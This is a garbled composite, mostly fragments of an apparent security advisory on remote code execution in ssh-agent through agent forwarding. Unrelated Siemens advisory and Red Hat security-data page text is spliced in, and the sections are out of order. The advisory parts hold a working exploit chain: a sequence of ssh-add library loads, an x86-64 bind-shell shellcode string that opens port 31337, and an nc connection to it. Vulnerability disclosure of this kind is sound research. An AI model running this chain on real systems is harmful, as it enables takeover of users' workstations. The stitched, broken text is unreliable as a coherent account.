(<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F21.10%2Fubuntu-21.10-desktop-amd64.iso&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=s6Y9CILGTxKnr0Ox53dA8v%2F2OblH63SBJOKvTb91jsE%3D&reserved=0><<https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso>>),

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:

workstation# apt-get --no-install-recommends install libenca-dbg

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:

Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1": agent refused operation

------------------------------------------------------------------------

3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libxkbregistry.so.0.0.0

------------------------------------------------------------------------

3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

========================================================================
Callback function use-after-free
========================================================================

While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:

- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
  but not unloaded (munmap()ed) by dlclose(), because it is marked as
  "nodelete" by the loader;

- a shared library (for example, libgnunetutil.so or gammaray_probe.so)
  is loaded and registers a userland callback function with the core
  library (via gcry_set_allocation_handler() or qtHookData[], for
  example), but it does not deregister this callback function when
  dlclose()d (i.e., when its code is munmap()ed);

- another shared library is loaded (mmap()ed) and replaces the unmapped
  callback function's code with another piece of code (a useful gadget);

- yet another shared library is loaded and calls one of the core
  library's functions, which in turn calls the unmapped callback
  function and therefore executes the replacement code (the useful
  gadget) instead, thus jumping to the stack.

------------------------------------------------------------------------

In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):

Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.

In the following example, one of libgcrypt.so's functions is called at
line 79114, the unmapped callback function is called at line 79143, the
replacement code (gadget) is executed instead at line 79144, and jumps
to the stack at line 79157:

While analyzing the strace logs of the dlopen() and dlclose() of every
shared library in /usr/lib*, we spotted an unusual SIGSEGV:

- a shared library is loaded, and its constructor function starts a
  thread that sleeps for 10 seconds in kernel-land:

- meanwhile, the main thread (ssh-pkcs11-helper) unloads this shared
  library (because it is not an actual PKCS#11 provider) and therefore
  munmap()s the code where the sleeping thread should return to after
  its sleep in kernel-land:

------------------------------------------------------------------------

3631347 munmap(0x7f5f3c3fb000, 33296)   = 0
------------------------------------------------------------------------

- the sleeping thread returns from kernel-land and crashes with a
  SIGSEGV because its userland code (at 0x7f5f3c3fecff) was unmapped:

------------------------------------------------------------------------

3631372 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f5f3c3fecff} ---
------------------------------------------------------------------------

Of course, we can request ssh-pkcs11-helper to load (mmap()) a
"nodelete" library before the sleeping thread returns from kernel-land,
thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:

Sigaltstack use-after-free
========================================================================

>From time to time, we noticed the following warning in the dmesg of our
fuzzing laptop:

------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------

On investigation, we discovered that at least one shared library
(libgnatcoll_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:

- we randomly load zero or more shared libraries that permanently alter
  the mmap layout;

- we load libgnatcoll_postgres.so, which registers an alternate signal
  stack and then munmap()s it without deregistering it;

- we randomly load zero or more shared libraries that alter the mmap
  layout (again), and hopefully replace the unmapped signal stack with
  another writable memory mapping (for example, a thread stack, or a
  .data or .bss segment);

- we randomly load one shared library that registers an SA_ONSTACK
  signal handler but does not munmap() its code when dlclose()d (unlike
  our original "Signal handler use-after-free" attack);

- we randomly load one shared library that raises this signal and
  therefore calls the SA_ONSTACK signal handler, thus overwriting the
  replacement memory mapping with stack frames from the signal handler;

- we randomly load one or more shared libraries that hopefully use the
  overwritten contents of the replacement memory mapping.

Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.

========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================

Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.

Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:

- a shared library raises a signal (a SIGSEGV in the example below, at
  line 134110) and, in consequence of a "Signal handler use-after-free",
  a replacement gadget of the form "ret N" is executed instead of the
  signal handler (at line 134111);

- exactly as the real signal handler would, the replacement gadget
  returns to the glibc's restore_rt() function (at line 134112), which
  in turn calls the kernel's rt_sigreturn() function (at line 134113);

- however, before the kernel's rt_sigreturn() function is called, the
  replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
  and as a result, the kernel's rt_sigreturn() function restores all
  userland registers (including RIP and RSP) from there;

------------------------------------------------------------------------

Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).

Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.

========================================================================
_Unwind_Context type-confusion
========================================================================

This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:

- some shared libraries load LLVM's libunwind.so as a "nodelete" library
  (i.e., it is never unloaded, even after dlclose());

- some shared libraries throw a C++ exception, which loads GCC's
  libgcc_s.so and calls the _Unwind_GetCFA() function (at line 57295 in
  the example below);

- however, GCC's libgcc_s.so mistakenly calls LLVM's _Unwind_GetCFA()
  (at line 57298) instead of GCC's _Unwind_GetCFA() (because LLVM's
  libunwind.so was loaded first), and passes a pointer to GCC's struct
  _Unwind_Context to this function (instead of a pointer to LLVM's
  struct _Unwind_Context, which is a different type of structure);

- LLVM's _Unwind_GetCFA() then calls its unw_get_reg() function (at line
  57303), which in turn calls a function pointer (at line 57311) that is
  a member of LLVM's struct _Unwind_Context, but that happens to be a
  stack pointer in GCC's struct _Unwind_Context;

------------------------------------------------------------------------

========================================================================
RCE in library constructor
========================================================================

As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.

The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:

    <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fwww.qualys.com%2F2023%2F06%2F06%2Frenderdoc%2Frenderdoc.txt&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=nofBS%2FHzMRkvCgf%2FnCVxTNk7qQdAy84QcWuVMsaxPl4%3D&reserved=0><<https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt>>

This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.

========================================================================
Discussion
========================================================================

We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:

- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
  versions, distributions, or operating systems might be hiding further
  surprises;

- our rudimentary fuzzer can certainly be greatly improved, and has
  definitely not tried all the combinations of shared libraries and side
  effects;

- we have identified seven attack vectors against ssh-agent (described
  in the "Results" section), but we have not analyzed in detail all the
  results of our fuzzer;

- we have not fully explored various aspects of these attack vectors:

  - it might be possible to reliably exploit the "Sigaltstack
    use-after-free" (by carefully overwriting the .data or .bss segment
    of a shared library) or the "Sigreturn to arbitrary instruction
    pointer" (by partially overwriting a leftover pointer in
    ssh-pkcs11-helper's stack);

  - we currently store our shellcode in ssh-pkcs11-helper's main() stack
    buffer only, but it might be possible to store shellcode in other
    stack buffers as well, or somehow spray the stack with shellcode,
    which would dramatically increase our chances of jumping into our
    shellcode;

    for example, we tried to spray the stack with shellcode by
    interrupting a memcpy() of controlled data with a signal handler,
    thereby spilling controlled YMM registers to the stack (inspired by
    <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D2266&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=mYENYDFpftGaac%2B5%2BGJcg%2FAKFVZhh%2BIyb6TLmRaMsfI%3D&reserved=0>)<<https://bugs.chromium.org/p/project-zero/issues/detail?id=2266>>, but
    we failed because we can memcpy() only ~10KB of data, and because we
    cannot remotely use tricks such as inotify or sched*() to precisely
    time this race;

  - it might be possible to control the mmap layout of ssh-pkcs11-helper
    with page precision (which would allow us to precisely control the
    gadget that replaces the unmapped signal handler, callback function,
    or return from syscall), but we failed to find large malloc()ations
    (which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
    influence the mmap layout is to load and unload shared libraries, as
    mentioned in Step 4a/ of the "Experiments" section);

  - instead of replacing the unmapped signal handler or callback
    function (or return from syscall) with a gadget from another shared
    library, it is perfectly possible to replace it with an executable
    thread stack (made executable by loading an "execstack" library),
    but we have failed so far to control the contents of such a thread
    stack.

Siemens Security Advisory by Siemens ProductCERT

Product-speciﬁc remediations or mitigations can be found in the section Affected Products and Solution.
Please follow the General Security Recommendations.

GENERAL SECURITY RECOMMENDATIONS

As a general security measure, Siemens strongly recommends to protect network access to devices
with appropriate mechanisms. In order to operate the devices in a protected IT environment, Siemens
recommends to conﬁgure the environment according to Siemens’ operational guidelines for Industrial
Security (Download: https://www.siemens.com/cert/operational-guidelines-industrial-security), and to
follow the recommendations in the product manuals.

Additional information on Industrial Security by Siemens can be found at: https://www.siemens.com/

PRODUCT DESCRIPTION

The SCALANCE X-204RNA Industrial Ethernet network access points enable the cost-effective connection
of non-PRP terminal devices to separate parallel networks, where a high availability is required.

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.1
(CVSS v3.1) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

An additional classiﬁcation has been performed using the CWE classiﬁcation, a community-developed list
of common software security weaknesses. This serves as a common language and as a baseline for
weakness identiﬁcation, mitigation, and prevention efforts. A detailed list of CWE classes can be found at:
https://cwe.mitre.org/.

Vulnerability CVE-2019-1552

OpenSSL has internal defaults for a directory tree where it can ﬁnd a conﬁguration ﬁle as well as
certiﬁcates used for veriﬁcation in TLS. This directory is most commonly referred to as OPENSSLDIR,
and is conﬁgurable with the –preﬁx / –openssldir conﬁguration options. For OpenSSL versions 1.1.0
and 1.1.1, the mingw conﬁguration targets assume that resulting programs and libraries are installed
in a Unix-like environment and the default preﬁx for program installation as well as for OPENSSLDIR
should be ‘/usr/local’. However, mingw programs are Windows programs, and as such, ﬁnd themselves
looking at sub-directories of ‘C:/usr/local’, which may be world writable, which enables untrusted users
to modify OpenSSL’s default conﬁguration, insert CA certiﬁcates, modify (or even replace) existing
engine modules, etc. For OpenSSL 1.0.2, ‘/usr/local/ssl’ is used as default for OPENSSLDIR on
all Unix and Windows targets, including Visual C builds. However, some build instructions for the
diverse Windows targets on 1.0.2 encourage you to specify your own –preﬁx. OpenSSL versions
1.1.1, 1.1.0 and 1.0.2 are affected by this issue. Due to the limited scope of affected deployments this
has been assessed as low severity and therefore we are not creating new releases at this time. Fixed
in OpenSSL 1.1.1d (Affected 1.1.1-1.1.1c). Fixed in OpenSSL 1.1.0l (Affected 1.1.0-1.1.0k). Fixed in

# Security Data

Red Hat Product Security is committed to providing tools and security data to help security measurement. A part of this commitment is our active participation in various projects such as the CVE Project, the OASIS CSAF technical committee, or SBOM/VEX forums. We provide the raw data below so customers and researchers can produce their own metrics, for their own unique situations, and hold us accountable. To receive notifications when we fix bugs and add new features, please follow the official [Red Hat Security Data Changelog](https://access.redhat.com/articles/5554431).

The data resources linked on this page as well as their alternative representations available through the [Security Data API](https://access.redhat.com/documentation/en-us/red_hat_security_data_api/1.0/html/red_hat_security_data_api/index) are licensed under the [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/). If you distribute this content or a modified version of it, you must provide attribution to Red Hat, Inc. and provide a link to the original.

**Note:** Security data (CSAF, OVAL, SBOM, and other files) published by Red Hat Product Security was previously served from two locations:

* https://access.redhat.com/security/data/\*
* https://www.redhat.com/security/data/\*

A new domain was recently created the scope of which (for the time being) is to serve this same data:

* https://security.access.redhat.com/data/\*

Effective Sep 3, 2024, a redirect was put in place for all traffic from *www.redhat.com/security/data/\** to be redirected to the new *security.access.redhat.com/data/\** domain. On Sep 30, a similar change was made for *access.redhat.com/security/data/\** to redirect to *security.access.redhat.com/data/*. No change to the actual files or directory layout under the *data/\** path was made. You can start consuming from the new domain today. For example: <https://access.redhat.com/security/data/csaf/v2/vex/2024/cve-2024-0151.json> is now available at <https://security.access.redhat.com/data/csaf/v2/vex/2024/cve-2024-0151.json>; on Sep 30, the former began redirecting to the latter.

### CSAF/VEX Documents

The Common Security Advisory Framework (CSAF) standard enables organizations to share information about security issues using a consistent and common format. We provide Red Hat security advisories in CSAF format using the VEX profile as well as per-CVE VEX documents that contains information on both fixed and unfixed products/components.

The CSAF advisory data for RPMs is convertered to OSV records and shared with OSV.dev. It is expected that customers will consume this data from OSV.dev not directly from this URL. This is the location OSV.dev consumes the data from.

### OVAL Definitions

**Note: OVAL/DS v1 files are no longer available and have been archived; see [OVAL v1 deprecation announcement](https://access.redhat.com/OVAL_v1_deprecation_announcement) for more information.**

OVAL definitions are available for vulnerabilities that were addressed in errata for Red Hat Enterprise Linux and select additional products. To completely evaluate your system you will need to evaluate it against the streams for all products installed on that system.

### Vulnerability Metadata

#### Repository to CPE Mapping

Used for matching [OVAL security data to installed RPMs](https://www.redhat.com/en/blog/how-accurately-match-oval-security-data-installed-rpms). Each repository also includes a set of relative URLs from where the content of the repository can be downloaded.

* [repository-to-cpe.json](https://security.access.redhat.com/data/meta/v1/repository-to-cpe.json)

#### RHSA RSS feed

An RSS feed that contains a list of Red Hat security advisories released in the last three days.

* [rhsa.rss](https://security.access.redhat.com/data/meta/v1/rhsa.rss)

#### CPE Dictionary

CPE is a structured naming scheme for information technology systems, software, and packages. For reference, we provide a dictionary mapping the CPE names we use, to Red Hat product descriptions. Some of these CPE names will be for new products that are not in the official CPE dictionary, and should therefore be treated as temporary CPE names:

* [cpe-dictionary.xml](https://security.access.redhat.com/data/meta/v1/cpe-dictionary.xml)

### Security Data Archive

Security data files that have been retired are available in an archive. Each file is marked with a date (YYYYMMDD) when it was last updated:

Summary
========================================================================

    "ssh-agent is a program to hold private keys used for public key
    authentication. Through use of environment variables the agent can
    be located and automatically used for authentication when logging in
    to other machines using ssh(1). ... Connections to ssh-agent may be
    forwarded from further remote hosts using the -A option to ssh(1)
    (but see the caveats documented therein), avoiding the need for
    authentication data to be stored on other machines."
    (<https://man.openbsd.org/ssh-agent.1>)

    "Agent forwarding should be enabled with caution. Users with the
    ability to bypass file permissions on the remote host ... can access
    the local agent through the forwarded connection. ... A safer
    alternative may be to use a jump host (see -J)."
    (<https://man.openbsd.org/ssh.1>)

Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.

While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE_PKCS11, which is the default).

(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)

Although this seems safe at first (because every shared library in
/usr/lib* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.

Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):

- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
  looked into any other versions, distributions, or operating systems;

- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
  and we ran it intermittently on a single laptop, so we have not tried
  all the combinations of shared libraries and side effects;

- we initially had only one attack vector in mind (i.e., one specific
  combination of side effects from shared libraries), but we discovered
  six more while analyzing the results of our fuzzer, and we are
  convinced that more attack vectors exist.

In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
<https://www.qualys.com/research/security-advisories/> (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).

========================================================================
Background
========================================================================

The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib*).

Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.

Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib*/*,/usr/local/lib*/*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1009>):

- if an attacker had access to the server where Alice's ssh-agent is
  forwarded to, and had an unprivileged access to Alice's workstation,
  then this attacker could store a malicious shared library in /tmp on
  Alice's workstation and execute it with Alice's privileges (via her
  forwarded ssh-agent) -- a mild form of Local Privilege Escalation;

- if the attacker had only access to the server where Alice's ssh-agent
  is forwarded to, but could somehow store a malicious shared library
  somewhere on Alice's workstation (without access to her workstation),
  then this attacker could remotely execute this shared library (via
  Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.

Our first reaction was of course to try to bypass ssh-agent's /usr/lib*
allow-list:

- by finding a logic bug in the filter function, match_pattern_list()
  (but we failed);

- by making a path-traversal attack, for example /usr/lib/../../tmp (but
  we failed, because ssh-agent first calls realpath() to canonicalize
  the path of a shared library, and then calls the filter function);

- by finding a locally or remotely writable file or directory in
  /usr/lib* (but we failed).

Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
<https://seclists.org/fulldisclosure/2010/Oct/344>):

- an unprivileged local attacker could dlopen() any shared library from
  /lib and /usr/lib (via the LD_AUDIT environment variable), even when
  executing a SUID-root program;

- the constructor functions of various common shared libraries created
  files and directories whose location depended on the attacker's
  environment variables and whose creation mode depended on the
  attacker's umask;

- the local attacker could therefore create world-writable files and
  directories anywhere in the filesystem, and obtain full root
  privileges (via crond, for example).

Although the ability to load and unload shared libraries from /usr/lib*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).

In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:

------------------------------------------------------------------------

1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU_STACK ELF header,
or implicitly because of a missing GNU_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().

For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.

------------------------------------------------------------------------

2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.

For example, /usr/lib/x86_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).

For example, /usr/lib/x86_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.

------------------------------------------------------------------------

4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.

For example, most of the /usr/lib/x86_64-linux-gnu/xtables/lib*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

And so an exciting idea to remotely exploit ssh-agent came into our
mind:

a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;

b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);

c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");

d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);

e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.

========================================================================
Experiments
========================================================================

But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:

------------------------------------------------------------------------

Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.

Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.

------------------------------------------------------------------------

Step 2 - For each shared library in /usr/lib*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.

------------------------------------------------------------------------

Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:

- 58 shared libraries make the stack executable when dlopen()ed (and the
  stack remains executable even after dlclose());

- 16577 shared libraries permanently alter the mmap layout when
  dlopen()ed (either because they are "nodelete" libraries, or because
